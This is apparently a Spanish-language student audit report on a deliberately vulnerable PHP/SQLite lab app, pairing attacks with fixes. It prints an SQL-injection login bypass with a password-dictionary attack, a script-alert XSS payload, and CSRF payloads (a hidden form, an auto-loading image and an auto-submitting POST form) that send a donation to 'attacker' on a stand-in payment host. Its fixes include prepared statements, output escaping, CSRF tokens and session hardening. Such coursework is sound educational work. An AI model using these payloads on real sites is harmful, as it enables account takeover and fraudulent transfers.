# Informe Técnico (Talent ScoutTech)

**Fecha:** 15/01/2026 

**Autor:** Asier Gonzalez

**Entorno:** Local (Apache + PHP + SQLite3)

**Enlace a archivos en repositorio:** https://github.com/asier-toraya/HE-P3-AG.git

## Índice
0. [Objetivo y entorno](#objetivo-y-entorno)
1. [Parte 1 - SQLi](#parte-1---sqli)
   - [a) SQLi error inicio de sesión](#a-sqli-error-inicio-de-sesión)
   - [b) Ataque de diccionario para impersonar usuarios](#b-ataque-de-diccionario-para-impersonar-usuarios)
   - [c) Vulnerabilidad en SQLite3::escapeString() y solución](#c-vulnerabilidad-en-sqlite3escapestring-y-solución)
   - [d) Publicar comentarios en nombre de otros usuarios mediante vulnerabilidades](#d-publicar-comentarios-en-nombre-de-otros-usuarios-mediante-vulnerabilidades)
2. [Parte 2 - XSS](#parte-2---xss)
   - [a) Crear un comentario con un alert de JavaScript](#a-crear-un-comentario-con-un-alert-de-javascript)
   - [b) Explicación del uso de &amp; en lugar de & en enlaces GET](#b-explicación-del-uso-de-amp-en-lugar-de--en-enlaces-get)
   - [c) Vulnerabilidad en show_comments.php y corrección](#c-vulnerabilidad-en-show_commentsphp-y-corrección)
   - [d) Identificar otras páginas afectadas por XSS y análisis](#d-identificar-otras-páginas-afectadas-por-xss-y-análisis)
3. [Parte 3 - Control de acceso, autenticación y sesiones de usuarios](#parte-3---control-de-acceso-autenticación-y-sesiones-de-usuarios)
   - [a) Medidas de seguridad para evitar un registro inseguro](#a-medidas-de-seguridad-para-evitar-un-registro-inseguro)
   - [b) Medidas de seguridad para asegurar el login](#b-medidas-de-seguridad-para-asegurar-el-login)
   - [c) Restricciones para el acceso a register.php](#c-restricciones-para-el-acceso-a-registerphp)
   - [d) Configuración de la carpeta private para evitar acceso no autorizado](#d-configuración-de-la-carpeta-private-para-evitar-acceso-no-autorizado)
   - [e) Análisis y aseguramiento del flujo de sesiones de usuarios](#e-análisis-y-aseguramiento-del-flujo-de-sesiones-de-usuarios)
4. [Parte 4 - Servidores web](#parte-4---servidores-web)
   - [a) Medidas de seguridad para reducir riesgos en el servidor web](#a-medidas-de-seguridad-para-reducir-riesgos-en-el-servidor-web)
5. [Parte 5 - CSRF](#parte-5---csrf)
   - [a) Botón Profile con formulario malicioso en list_players.php](#a-botón-profile-con-formulario-malicioso-en-list_playersphp)
   - [b) Creación de un comentario para un ataque CSRF sin interacción del usuario](#b-creación-de-un-comentario-para-un-ataque-csrf-sin-interacción-del-usuario)
   - [c) Condiciones necesarias para que el ataque funcione](#c-condiciones-necesarias-para-que-el-ataque-funcione)
   - [d) Blindaje contra CSRF usando POST y ataque alternativo](#d-blindaje-contra-csrf-usando-post-y-ataque-alternativo)
6. [Conclusiones](#conclusiones)

## **Objetivo y entorno**
Se documenta la resolucion tecnica de los apartados del enunciado para la aplicacion Talent ScoutTech y se responden a las preguntas planteadas. El entorno de prueba es local, con Apache, PHP y SQLite3.

<br>

# Parte 1 - SQLi
## a) SQLi error inicio de sesión
| Campo                                                          | Valor                                                    |
| -------------------------------------------------------------- | -------------------------------------------------------- |
| Escribo los valores ...                                        | User: `"`                                                |
| En el campo ...                                                | User                                                     |
| Del formulario de la página ...                                | login (`list_players.php`)                               |
| La consulta SQL que se ejecuta es ...                          | `SELECT userId, password FROM users WHERE username = ""` |
| Campos del formulario web utilizados en la consulta SQL ...    | username (User)                                          |
| Campos del formulario web no utilizados en la consulta SQL ... | password                                                 |

<br>

## b) Ataque de diccionario para impersonar usuarios
| Campo                                                                       | Valor                                                                                                                                                                               |
| --------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Explicación del ataque                                                      | SQLi en el campo User con un diccionario de contraseñas para eludir la autenticación e impersonar un usuario; se confirmó publicando un comentario y revisando el usuario asociado. |
| El ataque consiste en repetir ...                                           | el intento de login con el payload SQLi en User                                                                                                                                     |
| ... utilizando en cada interacción una contraseña diferente del diccionario | probando en cada interacción una contraseña distinta del diccionario hasta acertar.                                                                                                 |
| Campo de usuario con que el ataque ha tenido éxito                          | `" OR password="1234" --`                                                                                                                                                           |
| Campo de contraseña con que el ataque ha tenido éxito                       | `1234`                                                                                                                                                                              |

<br>

## c) Vulnerabilidad en SQLite3::escapeString() y solución

| Campo                                        | Valor                                                                                                                                                                                            |
| -------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Explicación del error ...                    | Se aplicaba `SQLite3::escapeString()` a toda la consulta concatenada con el usuario, permitiendo romper la consulta y ejecutar SQLi.                                                             |
| Solución: Cambiar la línea con el código ... | la consulta que concatena directamente el valor de `user` con `escapeString()`.                                                                                                                  |
| ... por la siguiente línea ...               | `$stmt = $db->prepare("SELECT userId, username, password FROM users WHERE username = :username");`<br>`$stmt->bindValue(":username", $username, SQLITE3_TEXT);`<br>`$result = $stmt->execute();` |


<br>

## d) Publicar comentarios en nombre de otros usuarios mediante vulnerabilidades

| Campo                                            | Valor                                                                                                                                                                                                                                                                          |
| ------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Vulnerabilidad detectada                         | SQL Injection (manipulación de parámetros) en `add_comment.php~` por uso directo de `$_GET['id']` sin validación ni consultas preparadas.                                                                                                                                      |
| Descripción del ataque                           | El archivo de backup `add_comment.php~` expone una consulta `INSERT` vulnerable que concatena directamente `$_GET['id']`. Al manipular el parámetro `id`, un atacante puede cerrar la consulta e inyectar valores propios, publicando comentarios en nombre de otros usuarios. |
| ¿Cómo podemos hacer que sea segura esta entrada? | Validar `id` como entero, usar consultas preparadas con `bind`, y evitar que archivos de backup (`~`, `.bak`) sean accesibles desde el servidor web.                                                                                                                           |

<br>

# Parte 2 - XSS

## a) Crear un comentario con un alert de JavaScript

| Campo                             | Valor                                  |
| --------------------------------- | -------------------------------------- |
| Introduzco el mensaje ...         | `<script>alert('XSS')</script>`        |
| En el formulario de la página ... | formulario "Add comment" de un jugador |

<br>

## b) Explicación del uso de `&amp`; en lugar de & en enlaces GET

| Campo           | Valor                                                                                                             |
| --------------- | ----------------------------------------------------------------------------------------------------------------- |
| Explicación ... | `&amp;` es la entidad HTML para representar `&` dentro de HTML; el navegador la decodifica y la URL real usa `&`. |

<br>

## c) Vulnerabilidad en show_comments.php y corrección

| Campo                                    | Valor                                                                                             |
| ---------------------------------------- | ------------------------------------------------------------------------------------------------- |
| ¿Cuál es el problema?                    | Salida sin escape de `username` y `body` (XSS) y uso directo de `$_GET['id']` en la query (SQLi). |
| Sustituyo el código de la/las líneas ... | la consulta con `$_GET['id']` y los `echo` de `username`/`body` sin sanitizar.                    |
| ... por el siguiente código ...          | ...                                                                                               |

```
if (isset($_GET['id'])) {
            $playerId = (int) $_GET['id'];

            $stmt = $db->prepare(
                'SELECT commentId, username, body
                FROM comments C, users U
                WHERE C.playerId = :playerId AND U.userId = C.userId
                ORDER BY C.playerId DESC'
            );
            $stmt->bindValue(':playerId', $playerId, SQLITE3_INTEGER);

            $result = $stmt->execute() or die('Invalid query');

            while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
                $safeUser = htmlspecialchars($row['username'], ENT_QUOTES, 'UTF-8');
                $safeBody = htmlspecialchars($row['body'], ENT_QUOTES, 'UTF-8');

                echo "<div>
                <h4> {$safeUser}</h4>
                <p>commented: {$safeBody}</p>
              </div>";
            }
        }
```
<br>

## d) Identificar otras páginas afectadas por XSS y análisis

| Campo                       | Valor                                                                                                                                   |
| --------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| Otras páginas afectadas ... | `list_players.php` (payload insertado desde `insert_player.php`).                                                                       |
| ¿Cómo lo he descubierto?    | Editando un jugador en `insert_player.php`, insertando el payload en "Player name" y verificando el alert al cargar `list_players.php`. |

<br>

# Parte 3 - Control de acceso, autenticación y sesiones de usuarios
## a) Medidas de seguridad para evitar un registro inseguro
- Token CSRF por sesión.
- Validación server-side (longitud, alfanumérico, password mínima).
- `password_hash`.
- Inserción con consulta preparada.
- Mensajes de error escapados.
- Registro requiere autenticación.

Justificación por medida:
| Medida                                                            | Justificación                                                                  |
| ----------------------------------------------------------------- | ------------------------------------------------------------------------------ |
| Token CSRF por sesión.                                            | Evita registros forzados desde otros sitios y valida la intención del usuario. |
| Validación server-side (longitud, alfanumérico, password mínima). | Aplica controles aunque se manipule el cliente y reduce credenciales débiles.  |
| `password_hash`.                                                  | Almacena contraseñas con hash seguro y sal, evitando texto claro.              |
| Inserción con consulta preparada.                                 | Separa datos y consulta, bloqueando SQLi en el registro.                       |
| Mensajes de error escapados.                                      | Evita XSS reflejado si el error incluye entrada de usuario.                    |
| Registro requiere autenticación.                                  | Evita altas no autorizadas y reduce spam de cuentas.                           |

Cambios aplicados (codigo):
Archivo: `/register.php`
```php
require dirname(__FILE__) . '/private/auth.php';
if (session_status() !== PHP_SESSION_ACTIVE) {
    session_start();
}
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(16));
}
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'] ?? '')) {
    $errors[] = 'Invalid CSRF token.';
}
if ($username === '' || $password === '') {
    $errors[] = 'Username and password are required.';
}
if ($username !== '' && !preg_match('/^[A-Za-z0-9_]+$/', $username)) {
    $errors[] = 'Username must be alphanumeric.';
}
if ($password !== '' && strlen($password) < 8) {
    $errors[] = 'Password must be at least 8 characters.';
}
$passwordHash = password_hash($password, PASSWORD_DEFAULT);
$stmt = $db->prepare('INSERT INTO users (username, password) VALUES (:username, :password)');
$stmt->bindValue(':username', $username, SQLITE3_TEXT);
$stmt->bindValue(':password', $passwordHash, SQLITE3_TEXT);
```

<br>

## b) Medidas de seguridad para asegurar el login
- Consultas preparadas (anti-SQLi).
- `password_verify` y migración automática de contraseñas en claro.
- Sesiones con `$_SESSION` y flags Secure/HttpOnly/SameSite=Lax.
- Regeneración de ID de sesión al login.
- Rate limit (5 intentos, bloqueo 5 min).
- Timeout por inactividad (15 min).

Justificación por medida:
| Medida                                                            | Justificación                                                           |
| ----------------------------------------------------------------- | ----------------------------------------------------------------------- |
| Consultas preparadas (anti-SQLi).                                 | Elimina concatenación insegura y evita inyección en login.              |
| `password_verify` y migración automática de contraseñas en claro. | Permite validar hashes y mejorar seguridad sin romper cuentas antiguas. |
| Sesiones con `$_SESSION` y flags Secure/HttpOnly/SameSite=Lax.    | Protege cookies frente a robo y reduce impacto de CSRF.                 |
| Regeneración de ID de sesión al login.                            | Mitiga fijación de sesión tras autenticación.                           |
| Rate limit (5 intentos, bloqueo 5 min).                           | Reduce ataques de fuerza bruta y abuso de credenciales.                 |
| Timeout por inactividad (15 min).                                 | Limita la ventana de secuestro de sesión.                               |

Cambios aplicados (codigo):
Archivo: `/private/auth.php`
```php
ini_set('session.use_strict_mode', '1');
session_set_cookie_params([
    'secure' => $secure,
    'httponly' => true,
    'samesite' => 'Lax',
]);
const MAX_LOGIN_ATTEMPTS = 5;
const LOCKOUT_SECONDS = 300;
const SESSION_TIMEOUT = 900;

function fetchUserByUsername($db, $username) {
    $stmt = $db->prepare('SELECT userId, username, password FROM users WHERE username = :username');
    $stmt->bindValue(':username', $username, SQLITE3_TEXT);
    $result = $stmt->execute();
    if ($result === false) {
        return null;
    }
    $row = $result->fetchArray(SQLITE3_ASSOC);
    return $row ?: null;
}

if ($row && verifyPasswordValue($password, $row['password'])) {
    session_regenerate_id(true);
    $_SESSION['userId'] = $row['userId'];
    upgradePasswordIfNeeded($db, $row['userId'], $password, $row['password']);
}
```

<br>

## c) Restricciones para el acceso a register.php
- `register.php` exige login.
- Registro deshabilitado por defecto, con lista blanca opcional.

Justificación por medida:
| Medida                                                         | Justificación                                    |
| -------------------------------------------------------------- | ------------------------------------------------ |
| `register.php` exige login.                                    | Restringe el registro a usuarios autorizados.    |
| Registro deshabilitado por defecto, con lista blanca opcional. | Permite control granular y evita altas abiertas. |

Cambios aplicados (codigo):
Archivo: `/register.php`
```php
$registrationEnabled = false;
$allowedUsers = [];
$currentUser = $_SESSION['user'] ?? '';
$registrationLocked = !$registrationEnabled && !in_array($currentUser, $allowedUsers, true);
if ($registrationLocked) {
    http_response_code(403);
    $errors[] = 'Registration is disabled for this account.';
}
```

<br>

## d) Configuración de la carpeta private para evitar acceso no autorizado
- `private/.htaccess` deniega acceso HTTP directo.
- Guard server-side en `private/conf.php` y `private/auth.php`.

Justificación por medida:
| Medida                                                        | Justificación                                                  |
| ------------------------------------------------------------- | -------------------------------------------------------------- |
| `private/.htaccess` deniega acceso HTTP directo.              | Impide exponer archivos sensibles desde el navegador.          |
| Guard server-side en `private/conf.php` y `private/auth.php`. | Defensa en profundidad si falla la configuración del servidor. |

Cambios aplicados (codigo):
Archivo: `/private/.htaccess`
```apacheconf
<IfModule mod_authz_core.c>
    Require all denied
</IfModule>
<IfModule !mod_authz_core.c>
    Order allow,deny
    Deny from all
</IfModule>
Options -Indexes
```
Archivo: `/private/conf.php` y `/private/auth.php`
```php
if (basename(__FILE__) === basename($_SERVER['SCRIPT_FILENAME'])) {
    http_response_code(403);
    exit('Forbidden');
}
```

<br>

## e) Análisis y aseguramiento del flujo de sesiones de usuarios
- Sesiones de servidor, sin cookies con credenciales.
- Regeneración de ID y expiración por inactividad.
- `session.use_strict_mode` activado.

Justificación por medida:
| Medida                                              | Justificación                                            |
| --------------------------------------------------- | -------------------------------------------------------- |
| Sesiones de servidor, sin cookies con credenciales. | Evita exponer credenciales en el cliente.                |
| Regeneración de ID y expiración por inactividad.    | Reduce fijación de sesión y limita sesiones abandonadas. |
| `session.use_strict_mode` activado.                 | Rechaza IDs no válidos y mitiga fijación.                |

Cambios aplicados (codigo):
Archivo: `/private/auth.php`
```php
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity']) > SESSION_TIMEOUT) {
    destroySession();
}
if (isset($_POST['Logout'])) {
    destroySession();
    header("Location: index.php");
    exit;
}
```

<br>

# Parte 4 - Servidores web
## a) Medidas de seguridad para reducir riesgos en el servidor web
Inventario del servidor (componentes):
- Servidor web (Apache).
- Runtime PHP.
- Base de datos SQLite (archivo `database.db`).
- Sistema operativo y filesystem.
- Transporte HTTPS/TLS.
- Cabeceras de seguridad HTTP.
- Observabilidad (logs y rate limiting).
- Entorno de despliegue.
- Backups y recuperación.

| Componente                            | Medidas                                                                                               | Justificación                                                 |
| ------------------------------------- | ----------------------------------------------------------------------------------------------------- | ------------------------------------------------------------- |
| Servidor web (Apache)                 | Actualizar Apache; deshabilitar directory listing; limitar métodos HTTP y deshabilitar TRACE/OPTIONS. | Reduce superficie de ataque y corrige CVE conocidas.          |
| Runtime PHP                           | Actualizar PHP; endurecer `php.ini` (display_errors off, límites de subida, funciones peligrosas).    | Evita filtrado de información y reduce vectores de ejecución. |
| Base de datos SQLite                  | Actualizar SQLite; permisos mínimos sobre `database.db`.                                              | Limita accesos no autorizados y el impacto de un compromiso.  |
| Sistema operativo y filesystem        | Permisos mínimos en archivos y carpetas; proteger rutas sensibles (p. ej. `private/`).                | Restringe el acceso a datos críticos y reduce exposición.     |
| Transporte HTTPS/TLS                  | Forzar HTTPS y HSTS en producción.                                                                    | Protege confidencialidad e integridad y evita downgrades.     |
| Cabeceras de seguridad HTTP           | CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy.                                        | Mitigan XSS, clickjacking, MIME sniffing y fuga de referrer.  |
| Observabilidad (logs y rate limiting) | Rate limiting y monitoreo de logs.                                                                    | Dificulta fuerza bruta y permite detección temprana.          |
| Entorno de despliegue                 | Separación de entornos y ocultación de versiones.                                                     | Minimiza exposición de datos y reduce fingerprinting.         |
| Backups y recuperación                | Backups regulares y pruebas de restauración.                                                          | Permiten recuperar el servicio ante incidentes o corrupción.  |

<br>

# Parte 5 - CSRF
## a) Botón Profile con formulario malicioso en list_players.php

| Campo           | Valor                                                                                               |
| --------------- | --------------------------------------------------------------------------------------------------- |
| En el campo ... | `team`                                                                                              |
| Introduzco ...  | HTML que renderiza un botón con petición GET a `web.pagos/donate.php?amount=100&receiver=attacker`. |

Payload usado:
```html
<form action="http://web.pagos/donate.php" method="GET">
  <input type="hidden" name="amount" value="100">
  <input type="hidden" name="receiver" value="attacker">
  <button type="submit">Profile</button>
</form>
```

<br>

## b) Creación de un comentario para un ataque CSRF sin interacción del usuario
Se publicó un comentario con un payload que realiza la petición al cargar `show_comments.php`.

Payload usado:
```html
<img src="http://web.pagos/donate.php?amount=100&receiver=attacker" alt="profile">
```

<br>

## c) Condiciones necesarias para que el ataque funcione
- La víctima debe estar autenticada en `web.pagos`.
- La plataforma debe aceptar la petición sin token CSRF.
- La cuenta debe tener fondos y permisos para donar.

<br>

## d) Blindaje contra CSRF usando POST y ataque alternativo
```html
<form id="csrf" action="http://web.pagos/donate.php" method="POST">
  <input type="hidden" name="amount" value="100">
  <input type="hidden" name="receiver" value="attacker">
</form>
<script>document.getElementById('csrf').submit();</script>
```
El uso de POST por si solo no es suficiente: el navegador sigue enviando cookies de sesion y la peticion puede forjarse sin un token CSRF o validaciones SameSite/Origin.



## Conclusiones
En este proyecto se ha auditado la aplicación Talent ScoutTech y su servidor web, detectando varias vulnerabilidades comunes en aplicaciones web y proponiendo medidas de mitigación sencillas y efectivas.

Los problemas más relevantes, como SQL Injection, XSS y CSRF, se deben principalmente a una validación insuficiente de las entradas de usuario y a una gestión insegura de sesiones y permisos del servidor.

Tras aplicar las correcciones recomendadas, la aplicación valida correctamente los datos, reduce el riesgo de ataques y protege mejor la información sensible. Además, el proyecto ha permitido comprender cómo se producen estos ataques y qué medidas prácticas pueden aplicarse para mitigarlos.